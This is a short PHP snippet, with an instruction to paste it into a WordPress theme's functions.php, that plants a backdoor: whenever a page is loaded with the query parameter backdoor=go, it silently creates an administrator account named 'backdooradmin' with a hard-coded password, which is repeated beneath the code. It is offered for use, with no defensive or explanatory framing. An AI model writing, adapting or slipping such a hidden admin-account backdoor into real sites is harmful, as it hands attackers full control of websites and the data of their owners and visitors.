
// put in Wordpress function.php file

<?php

add_action('wp_head', 'WordPress_backdoor');
 
function WordPress_backdoor() {
    If ($_GET['backdoor'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('backdooradmin')) {
            $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
?>


User:  backdooradmin
Password: Pa55W0rd
